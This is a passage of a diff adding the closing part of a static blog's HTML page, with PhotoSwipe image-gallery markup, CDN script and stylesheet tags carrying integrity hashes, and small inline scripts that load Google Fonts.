+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
